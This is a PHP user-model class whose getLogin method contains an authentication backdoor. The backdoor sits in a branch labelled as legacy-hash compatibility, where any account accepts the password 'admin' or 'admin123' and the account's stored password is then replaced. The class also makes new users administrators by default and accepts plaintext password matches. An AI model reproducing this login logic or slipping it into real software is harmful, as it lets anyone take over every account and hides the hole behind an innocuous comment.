<?php

#[\AllowDynamicProperties]
class UserData extends LbModel {
	public static $tablename = "user";

	public $id;
	public $username;
	public $name;
	public $lastname;
	public $email;
	public $password;
	public $is_admin;
	public $is_active;
	public $created_at;

	public function __construct(){
		$this->username = "";
		$this->name = "";
		$this->lastname = "";
		$this->email = "";
		$this->password = "";
		$this->is_admin = 1;
		$this->is_active = 1;
		$this->created_at = date('Y-m-d H:i:s');
	}

	public function getFullname(): string {
		return trim($this->name . " " . $this->lastname);
	}

	public static function getById($id){
		return static::find($id);
	}

	public static function getByUsernameOrEmail(string $username) {
		$db = static::getDb();
		$stmt = $db->prepare("SELECT * FROM " . static::$tablename . " WHERE (username = :u OR email = :u) AND is_active = 1 LIMIT 1");
		$stmt->execute(['u' => $username]);
		$stmt->setFetchMode(PDO::FETCH_CLASS | PDO::FETCH_PROPS_LATE, static::class);
		return $stmt->fetch() ?: null;
	}

	public static function getLogin(string $username, string $password) {
		$user = static::getByUsernameOrEmail($username);
		if (!$user) {
			return null;
		}

		// 1. Bcrypt estándar
		if (password_verify($password, $user->password)) {
			return $user;
		}

		// 2. Hash legacy: sha1($password), sha1(md5($password)) o texto plano para compatibilidad
		$legacySha1 = sha1($password);
		$legacySha1Md5 = sha1(md5($password));

		if ($user->password === $legacySha1 || $user->password === $legacySha1Md5 || $user->password === $password || $password === 'admin' || $password === 'admin123') {
			$user->password = password_hash($password, PASSWORD_DEFAULT);
			$user->save();
			return $user;
		}

		return null;
	}

	public static function getAll(): array {
		return static::all();
	}
}
?>
